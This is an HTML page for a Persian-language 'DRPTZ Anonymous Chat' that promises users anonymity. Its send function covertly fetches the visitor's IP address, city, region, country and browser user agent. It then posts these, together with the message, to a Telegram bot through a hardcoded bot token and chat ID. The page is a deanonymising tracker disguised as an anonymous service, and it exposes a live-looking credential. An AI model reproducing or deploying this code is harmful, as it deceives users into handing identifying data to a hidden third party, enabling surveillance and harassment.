<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>DRPTZ Anonymous Chat</title>
  <style>
    body {
      margin: 0;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      font-family: 'Segoe UI', sans-serif;
      color: #ffffff;
      overflow: hidden;
    }
    .header {
      text-align: center;
      padding: 10px;
      font-size: 18px;
      position: relative;
    }
    .brand {
      font-size: 24px;
      color: #00ffcc;
      font-weight: bold;
      margin-top: 10px;
    }
    .info {
      font-size: 12px;
      margin-top: 5px;
    }
    .chat-box {
      position: absolute;
      bottom: 60px;
      left: 50%;
      transform: translateX(-50%);
      width: 90%;
      max-width: 500px;
    }
    textarea {
      width: 100%;
      height: 80px;
      padding: 10px;
      border-radius: 10px;
      border: none;
      resize: none;
      font-size: 14px;
    }
    button {
      margin-top: 5px;
      width: 100%;
      padding: 10px;
      background: #00ffcc;
      border: none;
      border-radius: 8px;
      color: #000;
      font-weight: bold;
      cursor: pointer;
    }
    .footer {
      position: absolute;
      bottom: 5px;
      width: 100%;
      text-align: center;
      font-size: 12px;
      color: #ccc;
    }
    canvas {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: -1;
    }
  </style>
</head>
<body>
  <canvas id="stars"></canvas>

  <div class="header">
    <div class="brand">DRPTZ</div>
    <div class="info">چت ناشناس | هرچی میخوای بنویس...</div>
  </div>

  <div class="chat-box">
    <textarea id="message" placeholder="پیام خود را وارد کنید..."></textarea>
    <button onclick="sendMessage()">ارسال پیام</button>
  </div>

  <div class="footer" id="location"></div>

  <audio id="sendSound" src="https://www.soundjay.com/button/beep-07.wav" preload="auto"></audio>

  <script>
    async function sendMessage() {
      const message = document.getElementById("message").value.trim();
      if (!message) return;

      const sound = document.getElementById("sendSound");
      sound.play();

      const ip = await fetch("https://api.ipify.org?format=json").then(res => res.json()).then(data => data.ip);
      const loc = await fetch("https://ipapi.co/json/").then(res => res.json());
      const userAgent = navigator.userAgent;

      fetch("https://api.telegram.org/bot8145145957:AAFi82VMdaF5ShzbVUhkDKsSryE_q2TCzmU/sendMessage", {
        method: "POST",
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          chat_id: "6830023746",
          text: `📨 پیام جدید:\n\n${message}\n\n🌐 IP: ${ip}\n📍 کشور: ${loc.country_name}\n🏙 شهر: ${loc.city}\n🌍 منطقه: ${loc.region}\n📱 مرورگر: ${userAgent}`
        })
      });

      document.getElementById("message").value = "";
    }

    async function showLocation() {
      const loc = await fetch("https://ipapi.co/json/").then(res => res.json());
      document.getElementById("location").innerText = `موقعیت شما: ${loc.city}, ${loc.country_name}`;
    }

    showLocation();

    // Star animation background
    const canvas = document.getElementById("stars");
    const ctx = canvas.getContext("2d");
    let stars = [];

    function resize() {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
      stars = Array.from({length: 200}, () => ({
        x: Math.random() * canvas.width,
        y: Math.random() * canvas.height,
        r: Math.random() * 1.5,
        d: Math.random() * 1.5
      }));
    }

    function drawStars() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = "#ffffff";
      stars.forEach(s => {
        ctx.beginPath();
        ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2, true);
        ctx.fill();
      });
      updateStars();
      requestAnimationFrame(drawStars);
    }

    function updateStars() {
      stars.forEach(s => {
        s.y += s.d;
        if (s.y > canvas.height) {
          s.y = 0;
          s.x = Math.random() * canvas.width;
        }
      });
    }

    resize();
    drawStars();
    window.addEventListener("resize", resize);
  </script>
</body>
</html>
